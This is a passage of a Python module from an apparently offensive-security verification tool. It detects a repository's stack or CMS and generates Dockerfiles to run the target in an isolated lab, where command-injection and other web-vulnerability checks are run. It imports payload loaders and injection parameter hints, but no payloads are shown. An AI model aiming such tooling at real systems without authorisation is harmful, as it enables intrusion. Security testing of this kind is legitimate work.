"""Verificacion dinamica CMS-AGNOSTICA: cuando el objetivo no es WordPress/Drupal/Joomla (un
repo cualquiera), binoracle no se rinde -- si trae su PROPIO Dockerfile/docker-compose.yml, lo
construye y arranca tal cual; si NO trae ninguno, intenta reconocer el stack por sus propios
ficheros (package.json/requirements.txt/composer.json/*.php, ver _detect_and_write_auto_dockerfile)
y genera un Dockerfile minimo propio para arrancarlo -- deliberadamente acotado a un numero
pequeno de stacks comunes, nunca una garantia de arrancar CUALQUIER repo. En ambos casos, en una
red/entorno aislado propio, y verifica contra el contenedor real resultante, con la misma
disciplina de prueba dura (nunca `verified=True` por un codigo de estado, siempre por una
confirmacion independiente) que wpverify.py/drupalverify.py/joomlaverify.py.

Esto es deliberadamente mas limitado que los verificadores CMS-especificos: no hay login/sesion
de por medio (no hay un flujo de autenticacion generico que valga para cualquier stack), asi que
solo cubre clases de vulnerabilidad que no lo necesitan -- de momento, command injection via un
canario de fichero (igual de valido en Python/Node/Go/PHP/Java: todos escriben a disco igual) --
y se amplia poco a poco."""
from __future__ import annotations

import json
import os
import re
import subprocess
import time
from typing import Callable, List, Optional

from .wpverify import (  # wpverify parchea sys.path para requests si hace falta (ver su try/except)
    WpVerifyResult, _ALPINE_IMAGE, _FILE_UPLOAD_HINTS, _ID_HINTS, _PATH_HINTS,
                       _UPLOAD_BINARY_SUFFIXES, _HEADER_INJECTION_HINTS,
                       _REDIRECT_HINTS, _SQLI_HINTS, _URL_HINTS, _XML_HINTS, _XSS_HINTS,
                       _XssBrowserSession, _docker_daemon_ok, _http_request,
                       _http_request_raw_path, _lab_host,
                       _pick_param, _redirect_location_is_external, _run, _screenshot_response,
                       _screenshot_terminal_step,
                       _token, configure_burp_mcp)  # noqa: F401 -- reexportado a proposito, ver abajo
from .payload_kb import (load_command_injection_separators, load_open_redirect_templates,
                         load_ssti_arithmetic_payloads, load_xss_payloads)
import secrets

_COMPOSE_NAMES = ("docker-compose.yml", "docker-compose.yaml", "compose.yml", "compose.yaml")


# configure_burp_mcp/_http_request/_screenshot_response viven en wpverify.py (ver ahi) -- UN SOLO estado compartido
# por TODOS los verificadores (genericos y CMS-especificos), no una copia por modulo. Se
# reexportan aqui (import de arriba) para no romper el `from .genericverify import
# configure_burp_mcp` que cli.py/web.py ya usaban.

_CI_HINTS = ("cmd", "command", "exec", "run", "host", "ip", "address", "target", "ping",
             "domain", "url", "path", "file", "name", "query", "search", "input")


_AUTO_DOCKERFILE_NAME = ".binoracle_auto_Dockerfile"


def _http_lab(base_url: str, endpoint: str, method: str = "GET", *,
              headers=None, body=None, params=None, files=None,
              timeout: float = 15.0) -> tuple:
    """Thin adapter for lab verifiers: accepts (base_url, endpoint, method) convention
    and returns (status_code, response_headers_dict, body_bytes).
    Returns (0, {}, b"") on any connection error so callers can check `if st == 0`.
    """
    try:
        r = _http_request(
            method.upper(),
            base_url.rstrip("/") + endpoint,
            headers=headers or {},
            data=body,
            params=params,
            files=files,
            timeout=timeout,
        )
        return (r.status_code, dict(r.headers), r.content)
    except Exception:
        return (0, {}, b"")


def _build_http_params(
    parameters, payload: str, http_method: str, target_url: str, headers: dict
) -> tuple:
    """Normalize parameters (dict or list) into (body, url, headers).

    For a dict: builds a full URL-encoded body (POST) or query string (GET).
    For a list: uses the first element as param name + payload as value.
    Returns (body_or_None, target_url, headers).
    """
    from urllib.parse import urlencode as _ue
    body = None
    if isinstance(parameters, dict) and parameters:
        if http_method.upper() in ("POST", "PUT", "PATCH"):
            body = _ue(parameters)
            headers = dict(headers)
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            sep = "&" if "?" in target_url else "?"
            target_url = target_url + sep + _ue(parameters)
    else:
        param = (parameters or [None])[0] if parameters else None
        if http_method.upper() in ("POST", "PUT", "PATCH") and param:
            body = f"{param}={payload}"
            headers = dict(headers)
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        elif param and payload:
            sep = "&" if "?" in target_url else "?"
            target_url = target_url + sep + f"{param}={payload}"
    return body, target_url, headers


def _build_json_params(
    parameters, payload: str, http_method: str, target_url: str, headers: dict
) -> tuple:
    """Normalize parameters (dict or list) into (json_body, url, headers).

    For a dict: json.dumps(parameters) as body.
    For a list: json.dumps({first_param: payload}) as body.
    GET/query params handled via URL encoding.
    Returns (body_or_None, target_url, headers).
    """
    import json as _json
    from urllib.parse import urlencode as _ue
    body = None
    if isinstance(parameters, dict) and parameters:
        if http_method.upper() in ("POST", "PUT", "PATCH"):
            body = _json.dumps(parameters)
            headers = dict(headers)
            headers.setdefault("Content-Type", "application/json")
        else:
            sep = "&" if "?" in target_url else "?"
            target_url = target_url + sep + _ue(parameters)
    else:
        param = (parameters or [None])[0] if parameters else None
        if http_method.upper() in ("POST", "PUT", "PATCH") and param:
            body = _json.dumps({param: payload})
            headers = dict(headers)
            headers.setdefault("Content-Type", "application/json")
        elif param and payload:
            sep = "&" if "?" in target_url else "?"
            target_url = target_url + sep + f"{param}={payload}"
    return body, target_url, headers


def _best_python_image() -> str:
    """Returns the best available Python base image.

    Prefers python:3.11-slim (Debian-based, full glibc) but falls back to
    python:3.11-alpine when slim is not in the local Docker cache AND a quick
    pull attempt fails with Docker Hub rate-limiting (HTTP 429).  Alpine needs
    build tools for C-extension wheels (aiohttp, cryptography, etc.); they are
    added via a RUN apk add line injected by _alpine_python_build_deps().
    """
    # Check local cache first (fast path, no network)
    r = subprocess.run(
        ["docker", "images", "-q", "python:3.11-slim"],
        capture_output=True, text=True, timeout=10,
    )
    if r.returncode == 0 and r.stdout.strip():
        return "python:3.11-slim"
    # Try a quick pull; if rate-limited use alpine (already cached from session warm-up)
    pull = subprocess.run(
        ["docker", "pull", "python:3.11-slim"],
        capture_output=True, text=True, timeout=60,
    )
    if pull.returncode == 0:
        return "python:3.11-slim"
    combined = (pull.stdout or "") + (pull.stderr or "")
    if "429" in combined or "toomanyrequests" in combined.lower():
        return "python:3.11-alpine"
    return "python:3.11-slim"


def _alpine_python_build_deps() -> str:
    """Extra RUN step to install C build tools on Alpine Python images.

    Required for packages with C extensions (aiohttp, cryptography, lxml…).
    No-op on Debian/slim images (never inserted there).
    """
    return "RUN apk add --no-cache gcc musl-dev libffi-dev openssl-dev linux-headers"


# deteccion de stack cuando el repo NO trae su propio Dockerfile/compose -- deliberadamente
# acotada a los 3 casos mas comunes en PoCs publicos de CVEs web (Node/Python/PHP puro, sin
# framework que exija su propio arranque especial como Django/Rails). Cada entrada: (fichero que
# delata el stack, lineas del Dockerfile generado, puerto por defecto que se expone). Generalizar
# a CUALQUIER stack sin acotar la lista seria adivinar a ciegas -- mejor una lista corta y
# honesta que crece con casos reales confirmados, que una que finja cubrirlo todo.
def _build_stack_signals() -> tuple:
    """Build stack signals with dynamic Python base image selection."""
    py_image = _best_python_image()
    py_run_lines: list = ["WORKDIR /app", "COPY . ."]
    if "alpine" in py_image:
        py_run_lines.append(_alpine_python_build_deps())
    py_run_lines += [
        "RUN pip install --no-cache-dir -r requirements.txt || true",
        'CMD ["sh", "-c", "python app.py || python main.py || python manage.py runserver 0.0.0.0:5000"]',
    ]
    return (
        ("package.json", "node:20-alpine", 3000,
         ["WORKDIR /app", "COPY . .", "RUN npm install || npm install --legacy-peer-deps || true",
          'CMD ["sh", "-c", "npm start || node index.js || node app.js || node server.js"]']),
        # Ruby/Rails/Rack: se chequea antes que requirements.txt porque "rack" coincide
        # con el patron pip. Intenta rails server primero (si es una app Rails), luego rackup.
        ("Gemfile", "ruby:3.2-slim", 3000,
         ["RUN apt-get update -qq && apt-get install -y --no-install-recommends "
          "build-essential libsqlite3-dev nodejs npm && rm -rf /var/lib/apt/lists/*",
          "WORKDIR /app", "COPY . .",
          "RUN gem install bundler --no-document && bundle install --retry 3 || true",
          "RUN bundle exec rails db:create db:migrate 2>/dev/null || true",
          "ENV RAILS_ENV=development SECRET_KEY_BASE=binoracle_test_secret_32chars",
          'CMD ["sh", "-c", '
          '"bundle exec rails server -b 0.0.0.0 -p 3000 || '
          'bundle exec rackup --host 0.0.0.0 --port 3000 config.ru || '
          'ruby app.rb"]']),
        ("requirements.txt", py_image, 5000, py_run_lines),
        ("composer.json", "php:8.2-cli", 8000,
         ["WORKDIR /app", "COPY . .",
          "RUN (command -v composer >/dev/null && composer install --no-interaction || true)",
          'CMD ["php", "-S", "0.0.0.0:8000", "-t", "."]']),
        # Go: single-stage build with latest stable Go.
        # Uses golang:alpine (latest stable) so go.mod toolchain constraints are met.
        # CGO_ENABLED=1 for sqlite3 and other CGO dependencies.
        # Port 8080 is used; apps that read --port or $PORT get it via env/arg.
        # Go: use /usr/local/bin/app as output — avoids colliding with any source
        # subdirectory named 'server' (e.g. daptin has a server/ dir; -o /app/server
        # would treat it as a directory and place the binary inside it as /app/server/<name>).
        ("go.mod", "golang:alpine", 8080,
         ["WORKDIR /app",
          "RUN apk add --no-cache gcc musl-dev git netcat-openbsd sqlite-dev",
          "COPY . .",
          "RUN CGO_ENABLED=1 go build -o /usr/local/bin/app . || "
          "CGO_ENABLED=1 go build -o /usr/local/bin/app ./cmd/... || true",
          'ENV PORT=8080 SERVER_PORT=8080 GIN_MODE=release CGO_ENABLED=1',
          'CMD ["sh", "-c", '
          '"/usr/local/bin/app -port :8080 || '
          '/usr/local/bin/app --port :8080 || '
          '/usr/local/bin/app"]']),
        # Rust: multi-stage build; compila con release para binario pequeño.
        # El runtime usa debian:bookworm-slim (glibc) porque muchas crates usan libssl.
        ("Cargo.toml", "rust:1.76-slim", 8080,
         ["WORKDIR /app",
          "RUN apt-get update -qq && apt-get install -y --no-install-recommends "
          "pkg-config libssl-dev && rm -rf /var/lib/apt/lists/*",
          "COPY Cargo.toml Cargo.lock* ./",
          "RUN mkdir src && echo 'fn main(){}' > src/main.rs && "
          "cargo build --release 2>/dev/null || true && rm -rf src",
          "COPY . .",
          "RUN cargo build --release",
          'ENV ROCKET_PORT=8080 ROCKET_ADDRESS=0.0.0.0',
          'CMD ["sh", "-c", '
          '"./target/release/$(basename $(pwd)) --port 8080 || '
          './target/release/app || '
          'cargo run --release"]']),
        # .NET 8 / ASP.NET Core: imagen oficial mcr.microsoft.com; build pesado pero imagen
        # runtime ligera (~220 MB). Puerto 8080 es el default de .NET 8 en contenedores.
        ("*.csproj", "mcr.microsoft.com/dotnet/sdk:8.0", 8080,
         ["WORKDIR /app",
          "COPY . .",
          "RUN dotnet restore && dotnet publish -c Release -o /app/out",
          'ENV ASPNETCORE_URLS=http://0.0.0.0:8080',
          'CMD ["sh", "-c", '
          '"dotnet /app/out/*.dll || dotnet run --project ."]']),
        # Bun: detected by bun.lockb (Bun's lockfile). Uses oven/bun docker image.
        ("bun.lockb", "oven/bun:1-alpine", 3000,
         ["WORKDIR /app", "COPY . .",
          "RUN bun install || true",
          'CMD ["sh", "-c", "bun start || bun run index.ts || bun run src/index.ts || bun run app.ts"]']),
        # Deno: detected by deno.json (Deno config file). Uses denoland/deno image.
        ("deno.json", "denoland/deno:alpine", 8000,
         ["WORKDIR /app", "COPY . .",
          'CMD ["sh", "-c", '
          '"deno task start || deno run --allow-all main.ts || deno run --allow-all app.ts || deno run --allow-all src/main.ts"]']),
        # Java/Maven: detected by pom.xml. Uses openjdk; builds uber-jar.
        ("pom.xml", "maven:3.9-eclipse-temurin-21-alpine", 8080,
         ["WORKDIR /app",
          "COPY . .",
          "RUN mvn package -DskipTests -q || true",
          'ENV SERVER_PORT=8080',
          'CMD ["sh", "-c", "java -jar target/*.jar || mvn spring-boot:run"]']),
        # Java/Gradle: detected by build.gradle.kts (Kotlin DSL) or build.gradle (Groovy DSL).
        ("build.gradle.kts", "gradle:8-jdk21-alpine", 8080,
         ["WORKDIR /app",
          "COPY . .",
          "RUN gradle bootJar -x test -q || gradle shadowJar -x test -q || gradle assemble -x test -q || true",
          'ENV SERVER_PORT=8080',
          'CMD ["sh", "-c", "java -jar build/libs/*.jar || gradle bootRun"]']),
        ("build.gradle", "gradle:8-jdk21-alpine", 8080,
         ["WORKDIR /app",
          "COPY . .",
          "RUN gradle bootJar -x test -q || gradle shadowJar -x test -q || gradle assemble -x test -q || true",
          'ENV SERVER_PORT=8080',
          'CMD ["sh", "-c", "java -jar build/libs/*.jar || gradle bootRun"]']),
    )


_STACK_SIGNALS = _build_stack_signals()
# PHP sin composer.json (scripts sueltos, el caso mas comun en un PoC de un solo plugin/script
# vulnerable): activa el servidor de desarrollo embebido de PHP, sirve cualquier .php del repo
# tal cual, sin necesitar entender el proyecto.
_PHP_BARE_DOCKERFILE = ["WORKDIR /app", "COPY . .",
                       'CMD ["php", "-S", "0.0.0.0:8000", "-t", "."]']


def _detect_bare_flask_entry(source_dir: str) -> Optional[str]:
    """Busca un script Flask SUELTO (sin requirements.txt -- el caso real confirmado en vivo con
    CVE-2025-57633/FTP-Flask-python: un PoC de un solo fichero, `import flask`/`from flask
    import`, sin manifest de dependencias de ningun tipo). Devuelve el nombre del MODULO (sin
    '.py', para FLASK_APP) del primer candidato encontrado a <=2 niveles de profundidad, o None.
    Un simple `python <script>.py` no basta aqui: un PoC de un solo fichero casi siempre trae su
    propio `if __name__ == '__main__': app.run(...)` SIN `host='0.0.0.0'` (el default de Flask
    es 127.0.0.1) -- confirmado en vivo exactamente con ese CVE: el contenedor arrancaba bien,
    pero el mapeo de puertos de Docker nunca podia alcanzarlo (conexion rechazada/reseteada
    desde fuera, con o sin inyeccion real). `flask run --host=0.0.0.0` (ver el Dockerfile que
    construye esta deteccion) IGNORA ese `app.run()` hardcodeado por completo -- usa su propio
    servidor de desarrollo, nunca ejecuta el bloque `__main__` -- en vez de intentar parchear el
    binding del script del autor del PoC."""
    candidates = []
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        for fn in files:
            if not fn.lower().endswith(".py"):
                continue
            path = os.path.join(root, fn)
            try:
                with open(path, "r", errors="ignore") as f:
                    head = f.read(4096)
            except OSError:
                continue
            if re.search(r"^\s*(from flask import|import flask)\b", head, re.MULTILINE):
                rel = os.path.relpath(path, source_dir)
                candidates.append(rel[:-3].replace(os.sep, "."))   # quita '.py', path -> modulo
    return candidates[0] if candidates else None


def _package_json_has_runnable_entry(path: str) -> bool:
    """package.json por si solo NO basta como senal de 'esto es una app Node que se puede
    arrancar' -- un proyecto de OTRO stack puede traer uno solo para su pipeline de assets
    front-end (gulp/sass/webpack), sin ningun servidor Node real detras. Confirmado en vivo
    contra CVE-2026-9469 (StudentManagementSystem, PHP real): su package.json es el de la
    plantilla Bootstrap "SB Admin" (startbootstrap-sb-admin) -- solo dependencies/devDependencies
    de gulp/sass/jquery, SIN "main" NI "scripts" en absoluto -- y el orden de _STACK_SIGNALS
    (package.json antes que composer.json/PHP suelto) lo detectaba como stack Node por error,
    generando un Dockerfile que nunca llega a arrancar nada real (`npm start || node index.js
    || ...` -- ninguno existe) y dejando el PHP real (y por tanto la SQLi real) sin alcanzar
    nunca. Exige que declare como arrancarse de verdad: un "main" o un "scripts" no vacio (casi
    toda app Node real trae al menos uno de los dos) -- si no trae ninguno, no es senal de
    stack Node y se sigue probando el resto de _STACK_SIGNALS/deteccion PHP suelta."""
    try:
        import json
        with open(path, "r", errors="ignore") as f:
            data = json.load(f)
    except (OSError, ValueError):
        return False
    if not isinstance(data, dict):
        return False
    if data.get("main"):
        return True
    scripts = data.get("scripts")
    return bool(scripts) and isinstance(scripts, dict)


_PROXY_CA_FILENAME = ".binoracle_proxy_ca.crt"


def _proxy_dockerfile_lines(source_dir: str) -> List[str]:
    """Gap real encontrado en vivo investigando CVE-2025-57633 (FTP-Flask-python): el Dockerfile
    minimo auto-generado de arriba hace `RUN pip install flask` (o el equivalente npm/composer)
    dentro del `docker build`, pero un despliegue real de binoracle detras de un proxy saliente
    corporativo con re-terminacion TLS (exactamente la situacion de este propio sandbox de
    desarrollo) hace que ese paso falle con 'self-signed certificate in certificate chain' --
    el build nunca llega a arrancar nada, bloqueando CUALQUIER investigacion de un objetivo
    generico Python/Node/PHP sin Dockerfile propio, sin que sea un fallo real del objetivo.

    Cuando BINORACLE_DOCKER_BUILD_CA_CERT (ruta a un bundle CA) esta fijada, copia ese cert AL
    CONTEXTO de build (unico sitio desde el que un `COPY` del Dockerfile puede verlo) y devuelve
    las lineas a insertar justo despues del `FROM` -- antes de cualquier RUN de instalacion --
    para que pip/npm confien en el mismo proxy/CA que el resto de este proceso ya usa
    (HTTPS_PROXY se propaga via ARG/ENV, no solo al build sino tambien a los RUN posteriores).
    Vacio si la variable no esta fijada: ningun despliegue sin este proxy corporativo concreto
    se ve afectado."""
    ca_src = (os.environ.get("BINORACLE_DOCKER_BUILD_CA_CERT", "") or
              os.environ.get("SSL_CERT_FILE", ""))
    if not ca_src or not os.path.isfile(ca_src):
        return []
    try:
        import shutil as _shutil
        _shutil.copy(ca_src, os.path.join(source_dir, _PROXY_CA_FILENAME))
    except OSError:
        return []
    return [
        "ARG HTTPS_PROXY",
        "ENV HTTPS_PROXY=$HTTPS_PROXY",
        f"COPY {_PROXY_CA_FILENAME} /tmp/binoracle-ca.crt",
        "ENV NODE_EXTRA_CA_CERTS=/tmp/binoracle-ca.crt PIP_CERT=/tmp/binoracle-ca.crt "
        "NPM_CONFIG_CAFILE=/tmp/binoracle-ca.crt "
        "SSL_CERT_FILE=/tmp/binoracle-ca.crt BUNDLE_SSL_CA_CERT=/tmp/binoracle-ca.crt",
    ]


def _detect_cms_fingerprint(source_dir: str) -> Optional[str]:
    """Devuelve el nombre del CMS si se detecta en source_dir, o None.

    Los CMSs de Node.js (Ghost, Strapi, Payload) tienen manifiestos específicos que
    permiten un Dockerfile más preciso que el genérico 'npm start'. Craft CMS y otros
    CMSs PHP se manejan por la ruta composer.json normal.
    """
    pkg_path = os.path.join(source_dir, "package.json")
    if os.path.isfile(pkg_path):
        try:
            with open(pkg_path) as f:
                pkg = json.load(f)
            name = (pkg.get("name") or "").lower()
            deps_all = {**pkg.get("dependencies", {}), **pkg.get("devDependencies", {})}
            # Ghost: package.json tiene name="ghost" o dep "ghost-core"/"@tryghost/..."
            if name == "ghost" or any(k.startswith("@tryghost/") for k in deps_all):
                return "ghost"
            # Strapi: dep "@strapi/strapi" o name contains "strapi"
            if "@strapi/strapi" in deps_all or "strapi" in deps_all or "strapi" in name:
                return "strapi"
            # Payload CMS: dep "payload"
            if "payload" in deps_all and "payload" in (pkg.get("description", "") + name).lower():
                return "payload"
            # Directus: dep "directus" or "@directus/api"
            if "directus" in deps_all or "@directus/api" in deps_all or "directus" in name:
                return "directus"
            # Keystone: dep "@keystone-6/core" or "@keystonejs/keystone"
            if any(k.startswith(("@keystone-6/", "@keystonejs/")) for k in deps_all):
                return "keystone"
            # Vite: dep "vite" or name contains "vite"
            if "vite" in deps_all or "vite" in name:
                return "vite"
            # Hono: dep "hono"
            if "hono" in deps_all:
                return "hono"
            # h3: dep "h3"
            if "h3" in deps_all and "@types/h3" not in deps_all:
                return "h3"
            # Nitro/Nuxt: dep "nitropack" or "nuxt"
            if "nitropack" in deps_all or "nuxt" in deps_all:
                return "nitro"
            # Elysia: dep "elysia"
            if "elysia" in deps_all:
                return "elysia"
            # Remix: dep "@remix-run/node" or "@remix-run/react"
            if any(k.startswith("@remix-run/") for k in deps_all):
                return "remix"
            # SvelteKit: dep "@sveltejs/kit"
            if "@sveltejs/kit" in deps_all:
                return "sveltekit"
            # Astro: dep "astro"
            if "astro" in deps_all:
                return "astro"
        except (OSError, ValueError, KeyError):
            pass
    # PHP CMS detection via composer.json
    composer_path = os.path.join(source_dir, "composer.json")
    if os.path.isfile(composer_path):
        try:
            with open(composer_path) as f:
                comp = json.load(f)
            req = comp.get("require", {})
            if "craftcms/cms" in req:
                return "craft"
            if "drupal/core" in req or "drupal/core-recommended" in req:
                return "drupal"
            if "joomla/cms" in req or "joomla/framework" in req:
                return "joomla"
            if "typo3/cms-core" in req or "typo3/cms" in req:
                return "typo3"
            if "contao/core-bundle" in req:
                return "contao"
            if "prestashop/prestashop" in req:
                return "prestashop"
        except (OSError, ValueError, KeyError):
            pass
    # Drupal: web/core/lib/Drupal.php or modules/ folder without composer
    if (os.path.isfile(os.path.join(source_dir, "core", "lib", "Drupal.php")) or
            os.path.isfile(os.path.join(source_dir, "web", "core", "lib", "Drupal.php"))):
        return "drupal"
    # Joomla: includes/defines.php or libraries/joomla
    if (os.path.isfile(os.path.join(source_dir, "includes", "defines.php")) and
            os.path.isdir(os.path.join(source_dir, "libraries", "joomla"))):
        return "joomla"
    # Wagtail / Django CMS: requirements.txt con wagtail o django-cms
    req_path = os.path.join(source_dir, "requirements.txt")
    if os.path.isfile(req_path):
        try:
            content = open(req_path).read().lower()
            if "wagtail" in content:
                return "wagtail"
            if "django-cms" in content or "djangocms" in content:
                return "djangocms"
        except OSError:
            pass
    # Gitea: main.go or go.mod references code.gitea.io/gitea
    go_mod_path = os.path.join(source_dir, "go.mod")
    if os.path.isfile(go_mod_path):
        try:
            content = open(go_mod_path).read().lower()
            if "code.gitea.io/gitea" in content:
                return "gitea"
        except OSError:
            pass
    # Nextcloud: lib/versioncheck.php or apps/ dir with nextcloud structure
    if (os.path.isfile(os.path.join(source_dir, "version.php")) and
            os.path.isdir(os.path.join(source_dir, "apps"))):
        try:
            content = open(os.path.join(source_dir, "version.php")).read().lower()
            if "nextcloud" in content or "oc_version" in content:
                return "nextcloud"
        except OSError:
            pass
    # Mattermost: go.mod references mattermost-server
    if os.path.isfile(go_mod_path):
        try:
            content = open(go_mod_path).read().lower()
            if "mattermost/mattermost-server" in content:
                return "mattermost"
        except OSError:
            pass
    # Ruby: Gemfile references sinatra or rack
    gemfile_path = os.path.join(source_dir, "Gemfile")
    if os.path.isfile(gemfile_path):
        try:
            content = open(gemfile_path).read().lower()
            if "sinatra" in content:
                return "sinatra"
            if "rack" in content and "rails" not in content:
                return "rack"
            if "rails" in content:
                return "rails"
        except OSError:
            pass
    # Django / Flask: manage.py or app.py with Django/Flask imports
    if os.path.isfile(os.path.join(source_dir, "manage.py")):
        try:
            content = open(os.path.join(source_dir, "manage.py")).read()
            if "django" in content.lower():
                return "django"
        except OSError:
            pass
    # Gradio: requirements.txt or setup.py references gradio
    for _pyreq in ("requirements.txt", "setup.py", "pyproject.toml"):
        _pyreq_path = os.path.join(source_dir, _pyreq)
        if os.path.isfile(_pyreq_path):
            try:
                _pyreq_content = open(_pyreq_path).read().lower()
                if "gradio" in _pyreq_content:
                    return "gradio"
                if "flask" in _pyreq_content:
                    return "flask"
                if "fastapi" in _pyreq_content:
                    return "fastapi"
                if "django" in _pyreq_content:
                    return "django"
            except OSError:
                pass
    return None


def _pin_cms_image(base_image: str, pkg_version: str) -> str:
    """Pin a CMS Docker image to an exact version when pkg_version is known.

    Ghost images: ghost:5.68.3 → ghost:5.68.3
    Node images: node:18-alpine stays node:18-alpine unless a strapi/payload/etc image
    """
    if not pkg_version:
        return base_image
    # Ghost: replace 'ghost:5-alpine' or 'ghost:5' with 'ghost:<version>'
    if base_image.startswith("ghost:"):
        return f"ghost:{pkg_version}"
    # directus: 'directus/directus:latest' → 'directus/directus:<version>'
    if base_image.startswith("directus/directus:"):
        return f"directus/directus:{pkg_version}"
    # Strapi official image: 'strapi/strapi' → 'strapi/strapi:<version>'
    if base_image.startswith("strapi/strapi"):
        return f"strapi/strapi:{pkg_version}"
    # Gitea: 'gitea/gitea:latest' → 'gitea/gitea:<version>'
    if base_image.startswith("gitea/gitea:"):
        return f"gitea/gitea:{pkg_version}"
    # Nextcloud: 'nextcloud:latest' → 'nextcloud:<version>-apache'
    if base_image.startswith("nextcloud:"):
        _nc_v = pkg_version if "-" in pkg_version else f"{pkg_version}-apache"
        return f"nextcloud:{_nc_v}"
    # Mattermost: 'mattermost/mattermost-team-edition:latest' → ':<version>'
    if base_image.startswith("mattermost/"):
        _parts = base_image.rsplit(":", 1)
        return f"{_parts[0]}:{pkg_version}"
    return base_image


def _cms_dockerfile_lines(cms: str, source_dir: str,
                           pkg_version: str = "") -> Optional[tuple]:
    """Devuelve (base_image, port, run_lines) para un CMS conocido, o None.

    Los Dockerfiles generados aquí usan variables de entorno de desarrollo mínimas
    que permiten arrancar el CMS sin configuración real: SQLite in-memory / fichero
    .tmp, secrets dummy, NODE_ENV=development. Esto basta para explorar las rutas
    vulnerables sin persistencia real.

    `pkg_version`: when provided, pins the CMS image to that exact version
    (e.g. ghost:5.68.3 instead of ghost:5-alpine).
    """
    proxy = _proxy_dockerfile_lines(source_dir)
    if cms == "ghost":
        # Ghost >=5: 'node current/index.js' o 'node_modules/.bin/ghost start'
        # Usamos imagen oficial que ya trae la instalación
        lines = (["WORKDIR /var/lib/ghost"] + proxy +
                 ["ENV NODE_ENV=development",
                  "ENV database__client=sqlite3",
                  "ENV database__connection__filename=/var/lib/ghost/content/data/ghost-dev.db",
                  "ENV url=http://localhost:2368",
                  "RUN npm install --prefix /var/lib/ghost || true",
                  'CMD ["node", "current/index.js"]'])
        return (_pin_cms_image("ghost:5-alpine", pkg_version), 2368, lines)

    if cms == "strapi":
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ["ENV NODE_ENV=development",
                  "ENV DATABASE_CLIENT=sqlite",
                  "ENV DATABASE_FILENAME=.tmp/data.db",
                  "ENV JWT_SECRET=binoracle_dev_jwt_secret_32ch",
                  "ENV ADMIN_JWT_SECRET=binoracle_dev_admin_jwt_32ch",
                  "ENV APP_KEYS=binoracle_key1,binoracle_key2",
                  "ENV API_TOKEN_SALT=binoracle_api_token_salt_xx",
                  "RUN npm install || npm install --legacy-peer-deps || true",
                  "RUN npm run build -- --no-optimization 2>/dev/null || true",
                  'CMD ["npm", "run", "develop"]'])
        return ("node:18-alpine", 1337, lines)

    if cms == "payload":
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ["ENV NODE_ENV=development",
                  "ENV PAYLOAD_SECRET=binoracle_payload_secret_32ch",
                  "ENV DATABASE_URI=file:/app/.tmp/payload-dev.db",
                  "ENV MONGODB_URI=",
                  "RUN npm install || npm install --legacy-peer-deps || true",
                  'CMD ["sh", "-c", "npm run dev || npm start || node dist/server.js || node src/server.js"]'])
        return ("node:18-alpine", 3000, lines)

    if cms == "wagtail":
        _py = _best_python_image()
        _extra = (["RUN " + _alpine_python_build_deps().split("RUN ", 1)[1]]
                  if "alpine" in _py else [])
        lines = (["WORKDIR /app", "COPY . ."] + proxy + _extra +
                 ["RUN pip install --no-cache-dir -r requirements.txt || true",
                  "ENV DJANGO_SETTINGS_MODULE=mysite.settings.dev",
                  "RUN python manage.py migrate --run-syncdb 2>/dev/null || true",
                  'CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]'])
        return (_py, 8000, lines)

    if cms == "djangocms":
        _py = _best_python_image()
        _extra = (["RUN " + _alpine_python_build_deps().split("RUN ", 1)[1]]
                  if "alpine" in _py else [])
        lines = (["WORKDIR /app", "COPY . ."] + proxy + _extra +
                 ["RUN pip install --no-cache-dir -r requirements.txt || true",
                  "RUN python manage.py migrate --run-syncdb 2>/dev/null || true",
                  'CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]'])
        return (_py, 8000, lines)

    if cms == "gitea":
        # Use official Gitea Docker image; dev config uses SQLite for quick boot
        _base = _pin_cms_image("gitea/gitea:latest", pkg_version)
        lines = (["WORKDIR /data"] + proxy +
                 ["ENV GITEA__database__DB_TYPE=sqlite3",
                  "ENV GITEA__database__PATH=/data/gitea.db",
                  "ENV GITEA__server__DOMAIN=localhost",
                  "ENV GITEA__server__HTTP_PORT=3000",
                  "ENV GITEA__server__ROOT_URL=http://localhost:3000/",
                  "ENV GITEA__security__INSTALL_LOCK=true",
                  "ENV GITEA__security__SECRET_KEY=binoracle_dev_secret_key_gitea",
                  "ENV GITEA__server__SSH_PORT=22"])
        return (_base, 3000, lines)

    if cms == "nextcloud":
        # Use official Nextcloud image with SQLite for dev
        _base = _pin_cms_image("nextcloud:latest", pkg_version)
        lines = (["WORKDIR /var/www/html"] + proxy +
                 ["ENV SQLITE_DATABASE=nextcloud",
                  "ENV NEXTCLOUD_ADMIN_USER=admin",
                  "ENV NEXTCLOUD_ADMIN_PASSWORD=binoracle_dev_password",
                  "ENV NEXTCLOUD_TRUSTED_DOMAINS=localhost"])
        return (_base, 80, lines)

    if cms == "mattermost":
        # Mattermost 9.x requires MySQL or PostgreSQL — SQLite was removed in 7.x.
        # Bundle MariaDB inside the container for a self-contained lab.
        _base = _pin_cms_image("mattermost/mattermost-team-edition:latest", pkg_version)
        lines = (["USER root",
                  "RUN apt-get update -qq && apt-get install -y --no-install-recommends "
                  "mariadb-server && rm -rf /var/lib/apt/lists/*",
                  # Bootstrap MariaDB and create mattermost database
                  "RUN mysqld_safe --skip-networking & sleep 6 && "
                  "mysql -u root -e \"CREATE DATABASE mattermost CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\" && "
                  "mysql -u root -e \"CREATE USER 'mmuser'@'localhost' IDENTIFIED BY 'mmuser-password';\" && "
                  "mysql -u root -e \"GRANT ALL PRIVILEGES ON mattermost.* TO 'mmuser'@'localhost';\" && "
                  "mysql -u root -e \"FLUSH PRIVILEGES;\" && "
                  "mysqladmin shutdown",
                  "ENV MM_SQLSETTINGS_DRIVERNAME=mysql",
                  "ENV MM_SQLSETTINGS_DATASOURCE=\"mmuser:mmuser-password@tcp(localhost:3306)/mattermost?charset=utf8mb4,utf8&readTimeout=30s&writeTimeout=30s\"",
                  "ENV MM_SERVICESETTINGS_SITEURL=http://localhost:8065",
                  "ENV MM_EMAILSETTINGS_SMTPSERVER=localhost",
                  "ENV MM_EMAILSETTINGS_SMTPPORT=10025",
